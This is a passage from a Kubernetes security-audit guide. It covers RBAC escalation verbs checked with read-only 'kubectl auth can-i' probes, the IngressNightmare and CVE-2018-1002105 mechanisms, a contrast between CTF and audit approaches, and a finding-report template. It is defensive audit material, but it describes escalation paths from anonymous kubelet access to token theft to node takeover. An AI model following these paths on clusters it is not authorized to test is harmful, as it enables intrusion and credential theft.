### 10.6 RBAC escalation-primitive review — the verbs that are findings by themselves

Audit mode makes the §4.1 escalation verbs first-class *reportable items* even when you never exploit them, because the RBAC docs define them as inherently privileged. Enumerate, with `auth can-i`, whether the identity you are auditing holds any of these — each one is a finding with a canned attack path:

```bash
kubectl auth can-i create clusterrolebindings
kubectl auth can-i create rolebindings
kubectl auth can-i impersonate users           # also: groups, serviceaccounts
kubectl auth can-i escalate roles              # the explicit RBAC 'escalate' verb
kubectl auth can-i bind clusterroles           # the explicit RBAC 'bind' verb
kubectl auth can-i create pods/exec
kubectl auth can-i get secrets --all-namespaces
```

| Verb / primitive | Why it is escalation (per RBAC docs) | Report as |
|---|---|---|
| `bind` | lets a subject create a binding that references a role, even one more powerful than itself | privilege escalation primitive, High+ |
| `escalate` | lets a subject grant a role rights beyond its own, sidestepping the normal self-limit | privilege escalation primitive, High+ |
| `impersonate` | act as another user/group/SA via `--as`; every wall on that principal falls | effective cluster-admin if target is privileged, Critical |
| `create` on `*rolebindings` | bind an existing admin ClusterRole to self | self-escalation to admin, Critical |
| `create pods/exec` | shell into pods → steal their SA tokens | lateral + token theft, High |
| `get secrets` (broad) | harvest every credential in scope | credential exposure, High–Critical |

Normal RBAC forbids a subject from granting rights it does not itself possess; `bind` and `escalate` are the two documented exceptions that defeat that self-limit, which is precisely why their *presence* on a workload SA is reportable without exploitation. You can demonstrate `impersonate` non-destructively with a dry authorization check — `kubectl auth can-i list secrets --as system:serviceaccount:kube-system:<admin-sa>` returning `yes` proves the primitive without acting on it. Report the verb, the one-line path above, and the CIS "minimize wildcard/binding rights" control; leave the actual self-grant for a permitted exploitation window.

### 10.7 CVE anchors for the severity argument

Two advisories carry the "why unauthenticated reachability of control-plane components is severe" argument in a report:

- **CVE-2025-1974 — "IngressNightmare" (CVSS 9.8).** Per the Wiz and Sysdig writeups, an *unauthenticated* attacker with network access to the ingress-nginx **admission controller** achieves RCE: the admission webhook parses attacker-supplied Ingress object annotations, and an injection into them reaches an NGINX configuration directive (`ssl_engine`) that loads a shared library from a path the attacker controls — the payload is uploaded via the admission request itself and referenced through `/proc/<pid>/fd/<n>`, giving code execution in the controller pod, which typically runs with a powerful ServiceAccount that can read all cluster Secrets. It is the head of a family (CVE-2025-1097, -1098, -24514, -24513, same disclosure). Fixed in **ingress-nginx v1.11.5 / v1.12.1**. Two audit-relevant facts: the admission webhook is *normally reachable only in-cluster*, so any path that exposes it to the pod network (a flat network, a reachable webhook Service) sharply raises severity; and **the ingress-nginx project was retired in November 2025 with no further security releases planned** — meaning a vulnerable deployment has no upstream fix coming, which *strengthens* the report's urgency and the remediation ask (migrate off, don't wait for a patch). Audit probe is detection-only: identify the controller version from the deployment/image tag or the `/healthz` build info and compare against the fixed line; do not fire the annotation injection outside an explicitly authorized exploitation window.

- **CVE-2018-1002105 (kube-apiserver).** Per NVD, a flaw in the API server's handling of a connection-upgrade on proxied requests let an attacker reach backend servers — including the **kubelet** — over the API server's established connection with the API server's own credentials, i.e. unauthenticated access to the kubelet through the API server. Historically fixed (1.10.11 / 1.11.5 / 1.12.3). It is the era-marker for *why the kubelet and api-server proxy subresources are sensitive* (§5.8) — cite it in the §10.1 kubelet finding's background to explain to a triager that "the kubelet trusting the API server's upgraded connection" is a documented, high-impact failure mode, not a hypothetical.

### 10.8 CTF notes — audit lens vs. bounty lens

The misconfiguration classes here are classic CTF-box patterns, and the differences are instructive:

- **On a CTF box, a `200` from 10250/`/pods` or 10255 is an invitation to `kubeletctl scan rce` the whole box and exec immediately** — there is a flag at `/root/root.txt`, the intended path *is* exec→token→node, and noise is free. **In a bounty/audit, the same `200` is the deliverable** — you report the exposure and stop, because exec on a live multi-tenant cluster risks other tenants' data and your evidence budget is "prove the class," not "own the node."
- CTFs reward the full chain (anon kubelet → SA token → `can-i --list` → hostPath pod → node); audits reward the *earliest stoppable finding* plus a clearly-argued attack path, so you report at the kubelet exposure and *describe* the chain rather than walking all of it.
- The in-pod SA self-audit (§10.3) is the same first move in both: CTF players run `can-i --list` to find the way up; auditors run it to enumerate the control violations. Same command, opposite goal — the CTF asks "where does this take me," the audit asks "what should this not have been granted."
- `auth can-i --list` returning a thin, scoped result is a *win condition* for the auditor (a defensible "no escalation primitive present" claim) and a *dead end* for the CTF player — which is exactly why audit reports should foreground the scoped-SA negatives as coverage, not omit them.

### 10.9 Reporting template (audit engagements)

Structure every control finding the same way, impact-first:

1. **Title — class + location + impact.** "Unauthenticated kubelet read-only API on 198.51.100.x:10250 exposes all workload metadata (anonymous `GET /runningpods/`)."
2. **Preconditions.** Network reachability only; no credentials (or: an authorized test pod's own ServiceAccount).
3. **Detection.** The single read-only `curl`/`kubectl auth can-i` probe and its response (status line + minimal redacted body).
4. **Attack path for severity.** The chain this *enables* (exec→token→API→node, or SA verb→self-grant→cluster-admin), cited to the relevant phase above and the CVE anchors in §10.7 — this is where you argue High/Critical without having walked the whole chain.
5. **CIS control.** Name the benchmark control family violated (anonymous-auth, kubelet authz, RBAC wildcard/bind/escalate, etcd client-cert, SA auto-mount, secret access) and the exact server/kubelet flag that fixes it.
6. **Evidence & cleanup.** Response excerpts with secrets redacted to shape-only; note what you did *not* read (etcd keys, other tenants' tokens) as a scope statement; remove any test artifact you created.

Severity rules of thumb for this supplement's classes: anonymous `list secrets` or unauthenticated etcd/kubelet-exec reachability — Critical; anonymous kubelet read (`/pods`, 10255) or over-permissioned SA with an escalation primitive — High; unauth dashboard — High scaled by its SA; imagePullSecrets with push rights — High; auto-mounted default SA with only scoped read — Low/hardening. Map every one to the program's rubric and name the CIS control so the triager sees the root cause, not just the symptom.

---

*Attack-surface audit supplement added 2026-11-19 by claude-opus-4-8. Sources: kubernetes.io — kubelet authentication/authorization (https://kubernetes.io/docs/reference/command/kubelet-authentication-authorization/), RBAC (https://kubernetes.io/docs/reference/access-authn-authz/rbac/), checking API access / `kubectl auth can-i` (https://kubernetes.io/docs/reference/access-authn-authz/authorization/#checking-api-access); NVD CVE-2018-1002105 (https://nvd.nist.gov/vuln/detail/CVE-2018-1002105); IngressNightmare CVE-2025-1974 — Wiz (https://wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities) and Sysdig (https://sysdig.com/blog/detecting-and-mitigating-ingressnightmare-cve-2025-1974). Detection-first audit framing (read-only probes, evidence capture, CIS mapping, severity-by-attack-path); offensive detail in phases 0–9 preserved unchanged.*
